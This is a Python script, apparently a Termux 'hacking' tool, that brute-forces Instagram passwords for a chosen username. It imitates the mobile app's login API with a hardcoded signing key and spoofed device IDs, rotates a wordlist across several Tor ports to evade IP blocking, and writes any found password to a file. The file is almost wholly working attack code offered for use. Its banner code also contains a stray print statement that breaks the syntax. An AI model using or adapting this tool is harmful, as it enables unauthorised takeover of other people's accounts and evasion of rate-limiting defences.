#!/usr/bin/env python3

import sys
import os
import time
import subprocess
import shutil
import re
import json
import hmac
import hashlib
import secrets
import threading
import socket
from pathlib import Path

# ---------- Colors ----------
C = {
    'reset': '\033[0m', 'red': '\033[91m', 'green': '\033[92m',
    'yellow': '\033[93m', 'blue': '\033[94m', 'magenta': '\033[95m',
    'cyan': '\033[96m', 'white': '\033[97m', 'bold': '\033[1m',
}
def color(text, col): return f"{col}{text}{C['reset']}"

# ---------- Tool Password ----------
TOOL_PASSWORD = "dark"
HELP_VIDEO_URL = "https://youtube.com/@aryanedp?si=4WQLRF97hfP1ed8E"

def check_password():
    print(color("\n" + "="*60, C['cyan']))
    print(color("  🔒 Tool Protected – Password Required", C['bold'] + C['yellow']))
    print(color("  Get the password by watching this video:", C['green']))
    print(color(f"  📺 {HELP_VIDEO_URL}", C['blue']))
    print(color("="*60 + "\n", C['cyan']))
    pwd = input(color("Enter password: ", C['green']))
    if pwd != TOOL_PASSWORD:
        print(color("\n[✗] Wrong password! Exiting.\n", C['red']))
        print(color(f"Please watch the full video to get the correct password:\n{HELP_VIDEO_URL}", C['yellow']))
        sys.exit(1)
    print(color("\n[✓] Password correct.\n", C['green']))

# ---------- YouTube Subscription Prompt ----------
def ask_youtube_subscription(channel_url="https://youtube.com/@aryanedp?si=4WQLRF97hfP1ed8E"):
    print(color("\n" + "="*60, C['cyan']))
    print(color("  Please support the developer by subscribing to our YouTube channel!", C['yellow']))
    print(color(f"  Channel: {channel_url}", C['green']))
    print(color("="*60 + "\n", C['cyan']))
    try:
        if shutil.which("termux-open"):
            subprocess.run(["termux-open", channel_url])
        elif shutil.which("xdg-open"):
            subprocess.run(["xdg-open", channel_url])
        else:
            print(color("[!] Open this link manually: " + channel_url, C['yellow']))
    except: pass
    for i in range(10, 0, -1):
        print(color(f"  Starting tool in {i} seconds...", C['blue']), end="\r")
        time.sleep(1)
    print(color("\n[✓] Proceeding.\n", C['green']))

# ---------- Banner (no extra spaces, no scrolling) ----------
def banner():
    # Clear screen first
    os.system('clear')  # or 'cls' on Windows, but Termux uses 'clear'
    lines = [
        f"                              {C['bold']}{C['cyan']}______",
        f"                           {C['bold']}{C['cyan']}.-\"      \"-.",
        f"                          {C['bold']}{C['cyan']}/            \\",
        f"                         {C['bold']}{C['cyan']}|              |",
        f"                         {C['bold']}{C['cyan']}|,  {C['red']}.-.  .-.{C['reset']}{C['bold']}{C['cyan']}  ,|",
        f"                         {C['bold']}{C['cyan']}| ){C['red']}(_X/  \\X_){C['reset']}{C['bold']}{C['cyan']}( |     {C['bold']}{C['white']}Author : THE SILENT HACKER RAJ 🚭{C['reset']}",
        f"                         {C['bold']}{C['cyan']}|/     /\\     \\|    {C['yellow']}Use at your own risk{C['red']}!!{C['reset']}",
        f"               {C['bold']}{C['cyan']}(@_       (_     ^^     _)",
        f"          {C['bold']}{C['cyan']}_     ) \\_______\\__|IIIIII|__/____{C['red']}^{C['reset']}{C['bold']}{C['cyan']}_{C['red']}^{C['reset']}{C['bold']}{C['cyan']}_{C['red']}^{C['reset']}{C['bold']}{C['cyan']}_{C['red']}^{C['reset']}{C['bold']}{C['cyan']}_{C['red']}^{C['reset']}{C['bold']}{C['cyan']}_{C['red']}^{C['reset']}{C['bold']}{C['cyan']}__",
        f"         {C['bold']}{C['cyan']}(_)@8@8{{}}<________|-\\\\IIIIII/-|____________________>",
        f"                {C['bold']}{C['cyan']})_/        \\          /     {C['red']}V  V  V  V  V{C['reset']}",
        f"               {C['bold']}{C['cyan']}(@           `--------`",
 print("""
    █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
   ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║
   ███████║██████╔╝ ╚████╔╝ ███████║██╔██╗ ██║
   ██╔══██║██╔══██╗  ╚██╔╝  ██╔══██║██║╚██╗██║
   ██║  ██║██║  ██║   ██║   ██║  ██║██║ ╚████║
   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
""")
    ]
    for line in lines:
        if line:
            print(line)
            time.sleep(0.03)
    print()

# ---------- Helper Functions ----------
def random_hex(length):
    return secrets.token_hex(length // 2)[:length]

def generate_device_ids():
    s4, s8, s12, s16 = random_hex(4), random_hex(8), random_hex(12), random_hex(16)
    device = f"android-{s16}"
    uuid = random_hex(32)
    phone = f"{s8}-{s4}-{s4}-{s4}-{s12}"
    guid = f"{s8}-{s4}-{s4}-{s4}-{s12}"
    return device, uuid, phone, guid

def validate_username(username):
    import requests
    url = f"https://www.instagram.com/{username}/"
    try:
        r = requests.get(url, timeout=10)
        if "the page may have been removed" in r.text or r.status_code == 404:
            return False
        return True
    except:
        return False

# ---------- Tor Manager (Single Instance) ----------
class TorManager:
    def __init__(self, ports, base_dir="tor_data"):
        self.ports = ports
        self.base_dir = Path(base_dir)
        self.process = None
        self.tor_working = False

    def start(self):
        subprocess.run(["pkill", "-f", "tor"], capture_output=True)
        time.sleep(1)
        self.base_dir.mkdir(exist_ok=True)
        data_dir = self.base_dir / "data"
        data_dir.mkdir(exist_ok=True)
        torrc = self.base_dir / "torrc"
        with open(torrc, "w") as f:
            f.write(f"DataDirectory {data_dir.absolute()}\n")
            f.write("CookieAuthentication 0\n")
            f.write("SafeLogging 1\n")
            f.write("Log notice stdout\n")
            for port in self.ports:
                f.write(f"SocksPort 127.0.0.1:{port}\n")
        print(color("[*] Starting single Tor instance on ports: " + ", ".join(map(str, self.ports)), C['green']))
        self.process = subprocess.Popen(
            ["tor", "-f", str(torrc)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print(color("[*] Waiting 15 seconds for Tor to bootstrap...", C['yellow']))
        time.sleep(15)
        working_ports = 0
        for port in self.ports:
            cmd = ["curl", "--socks5", f"127.0.0.1:{port}", "-s", "--max-time", "10", "https://httpbin.org/ip"]
            try:
                res = subprocess.run(cmd, capture_output=True, timeout=12)
                if res.returncode == 0 and b"origin" in res.stdout:
                    print(color(f"[*] Tor on port {port} is OK", C['green']))
                    working_ports += 1
                else:
                    print(color(f"[*] Tor on port {port} FAILED", C['red']))
            except:
                print(color(f"[*] Tor on port {port} FAILED", C['red']))
        if working_ports == len(self.ports):
            self.tor_working = True
            print(color("[✓] Tor is fully operational.", C['green']))
        else:
            self.tor_working = False
            print(color("[!] Tor is not working properly.", C['red']))
        return self.tor_working

    def kill(self):
        if self.process:
            self.process.terminate()
            self.process.wait()
        subprocess.run(["pkill", "-f", "tor"], capture_output=True)

# ---------- Instagram API ----------
class InstagramAPI:
    IG_SIG_KEY = "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
    LOGIN_URL = "https://i.instagram.com/api/v1/accounts/login/"
    FETCH_URL = "https://i.instagram.com/api/v1/si/fetch_headers/"

    def __init__(self, proxy_port=None, use_tor=True):
        import requests
        self.use_tor = use_tor
        self.session = requests.Session()
        if use_tor and proxy_port:
            self.session.proxies = {
                "http": f"socks5://127.0.0.1:{proxy_port}",
                "https": f"socks5://127.0.0.1:{proxy_port}"
            }
        self.device, self.uuid, self.phone, self.guid = generate_device_ids()
        self.csrftoken = None

    def fetch_csrftoken(self):
        headers = {
            "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)",
            "Accept": "*/*",
        }
        params = {"challenge_type": "signup", "guid": self.uuid}
        try:
            resp = self.session.get(self.FETCH_URL, params=params, headers=headers, timeout=15)
            self.csrftoken = self.session.cookies.get('csrftoken')
            if not self.csrftoken:
                for cookie in resp.cookies:
                    if cookie.name == 'csrftoken':
                        self.csrftoken = cookie.value
                        break
            return self.csrftoken is not None
        except Exception as e:
            print(color(f"[!] Fetch csrftoken error: {e}", C['red']))
            return False

    def sign(self, data):
        data_str = json.dumps(data, separators=(',', ':'))
        return hmac.new(self.IG_SIG_KEY.encode(), data_str.encode(), hashlib.sha256).hexdigest() + "." + data_str

    def login(self, username, password):
        if not self.csrftoken and not self.fetch_csrftoken():
            return "error"
        data = {
            "phone_id": self.phone,
            "_csrftoken": self.csrftoken,
            "username": username,
            "guid": self.guid,
            "device_id": self.device,
            "password": password,
            "login_attempt_count": "0"
        }
        payload = {"ig_sig_key_version": "4", "signed_body": self.sign(data)}
        headers = {
            "Connection": "close",
            "Accept": "*/*",
            "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie2": "$Version=1",
            "Accept-Language": "en-US",
            "User-Agent": "Instagram 10.26.0 Android"
        }
        try:
            resp = self.session.post(self.LOGIN_URL, data=payload, headers=headers, timeout=15)
            text = resp.text
            if "logged_in_user" in text:
                return "success"
            if "challenge" in text:
                return "challenge"
            if "Please wait" in text or "many tries" in text:
                return "wait"
            return "unknown"
        except:
            return "error"

# ---------- Brute-force Engine ----------
class BruteEngine:
    def __init__(self, username, wordlist_path, use_tor=True, tor_ports=None):
        self.username = username
        self.wordlist_path = wordlist_path
        self.use_tor = use_tor
        self.tor_ports = tor_ports or [9051, 9052, 9053, 9054, 9055]
        self.stop = threading.Event()
        self.tried = 0
        self.total = 0
        self.lock = threading.Lock()
        self.idx = 0
        self.nottested = []
        self.found = False

    def load(self, resume=0):
        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            self.total = sum(1 for _ in f)
        self.idx = resume

    def get_pass(self):
        with self.lock:
            if self.idx >= self.total: return None
            i = self.idx
            self.idx += 1
        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for j, line in enumerate(f):
                if j == i: return line.rstrip('\n')
        return None

    def save_found(self, pwd):
        with open("found.instainsane", "a") as f:
            f.write(f"Username: {self.username}, Password: {pwd}\n")
        print(color(f"\n[✓] PASSWORD FOUND: {pwd}", C['green']))

    def save_session(self):
        if self.found: return
        Path("sessions").mkdir(exist_ok=True)
        fname = f"sessions/store.session.{self.username}.{time.strftime('%Y%m%d_%H%M%S')}"
        with open(fname, "w") as f:
            f.write(f"user='{self.username}'\nwl_pass='{self.wordlist_path}'\ntoken={self.idx-1}\n")
        print(color(f"[*] Session saved: {fname}", C['green']))

    def save_nottested(self):
        if self.nottested:
            with open("nottested.lst", "w") as f:
                f.write("\n".join(self.nottested))
            print(color(f"[*] Saved {len(self.nottested)} untested passwords", C['yellow']))

    def worker(self, wid, port):
        api = InstagramAPI(proxy_port=port, use_tor=self.use_tor)
        if not api.fetch_csrftoken():
            print(color(f"[Worker {wid}] Failed to get csrftoken", C['red']))
            return
        while not self.stop.is_set():
            pwd = self.get_pass()
            if pwd is None: break
            with self.lock:
                self.tried += 1
                cur, tot = self.tried, self.total
            print(color(f"Trying ({cur}/{tot}): ", C['cyan']) + color(f"\"{pwd}\"", C['yellow']))
            res = api.login(self.username, pwd)
            if res == "success":
                self.save_found(pwd)
                self.found = True
                self.stop.set()
                break
            elif res == "challenge":
                self.save_found(pwd)
                self.stop.set()
                break
            elif res == "wait":
                with self.lock: self.nottested.append(pwd)
            else:
                with self.lock: self.nottested.append(pwd)

    def run(self):
        tor_mgr = None
        if self.use_tor:
            tor_mgr = TorManager(self.tor_ports)
            if not tor_mgr.start():
                print(color("[!] Tor failed to start. Continue without proxy? (y/n)", C['yellow']))
                ans = input().lower()
                if ans != 'y':
                    print(color("[!] Exiting. Please install/configure Tor manually.", C['red']))
                    sys.exit(1)
                else:
                    self.use_tor = False
                    print(color("[*] Continuing without Tor (direct connection). Your IP may be blocked.", C['red']))
            else:
                print(color("[*] Tor is ready. Starting brute-force...", C['green']))
        else:
            print(color("[*] Running without Tor (direct connection).", C['yellow']))

        threads = []
        if self.use_tor:
            ports_to_use = self.tor_ports
        else:
            ports_to_use = [None]
        for i, port in enumerate(ports_to_use):
            t = threading.Thread(target=self.worker, args=(i, port))
            t.start()
            threads.append(t)
            time.sleep(0.5)
        try:
            for t in threads: t.join()
        except KeyboardInterrupt:
            print(color("\n[!] Stopping... saving session", C['yellow']))
            self.stop.set()
            self.save_session()
            self.save_nottested()
            if tor_mgr: tor_mgr.kill()
            sys.exit(0)
        self.save_nottested()
        if tor_mgr: tor_mgr.kill()

# ---------- Resume ----------
def resume():
    banner()
    sess_dir = Path("sessions")
    if not sess_dir.exists():
        print(color("[!] No sessions", C['red']))
        return
    sessions = list(sess_dir.glob("store.session.*"))
    if not sessions:
        print(color("[!] No session files", C['red']))
        return
    print(color("Available sessions:", C['green']))
    for i, sf in enumerate(sessions, 1):
        with open(sf) as f:
            c = f.read()
            u = re.search(r"user='(.*?)'", c).group(1)
            w = re.search(r"wl_pass='(.*?)'", c).group(1)
            t = re.search(r"token=(\d+)", c).group(1)
            print(color(f"{i}: {u} - {w} (line {t})", C['white']))
    ch = input(color("Choose number: ", C['green']))
    try:
        idx = int(ch) - 1
        with open(sessions[idx]) as f:
            c = f.read()
            u = re.search(r"user='(.*?)'", c).group(1)
            w = re.search(r"wl_pass='(.*?)'", c).group(1)
            t = int(re.search(r"token=(\d+)", c).group(1))
    except:
        print(color("Invalid choice", C['red']))
        return
    engine = BruteEngine(u, w, use_tor=True)
    engine.load(resume=t+1)
    engine.run()

# ---------- Main ----------
def main():
    if "--resume" in sys.argv:
        resume()
        return

    ask_youtube_subscription()
    check_password()

    # Clear screen and show banner
    os.system('clear')
    banner()

    # Ask about Tor before anything else
    print(color("\n[?] Use Tor proxy for anonymity?", C['yellow']))
    print(color("    - Tor hides your IP but requires installation and may be slow", C['white']))
    print(color("    - Direct connection is faster but your real IP is exposed", C['white']))
    use_tor_input = input(color("    Continue with Tor? (y/n): ", C['green'])).lower()
    use_tor = (use_tor_input == 'y')

    # Check/install Tor only if user wants it
    if use_tor and not shutil.which("tor"):
        print(color("[!] Tor not found. Installing...", C['yellow']))
        subprocess.run(["pkg", "install", "tor", "-y"])
    # Python packages (always needed)
    try:
        import requests, socks
    except ImportError:
        print(color("[!] Installing Python packages...", C['yellow']))
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "PySocks"])
        print(color("[✓] Packages installed. Please re-run the script.", C['green']))
        sys.exit(0)

    import requests, socks

    # Username
    while True:
        user = input(color("Enter Instagram Username: ", C['green']))
        if validate_username(user):
            break
        print(color("Invalid Username! Try again", C['red']))

    # Wordlist
    default_wl = "passwords.lst"
    wl_input = input(color(f"Password List (Enter for '{default_wl}'): ", C['green']))
    wl_pass = wl_input.strip() if wl_input.strip() else default_wl
    if not Path(wl_pass).exists():
        print(color(f"[!] Wordlist '{wl_pass}' not found.", C['red']))
        sys.exit(1)

    print(color("[*] Starting brute-force...", C['green']))
    engine = BruteEngine(user, wl_pass, use_tor=use_tor)
    engine.load()
    engine.run()

if __name__ == "__main__":
    main()
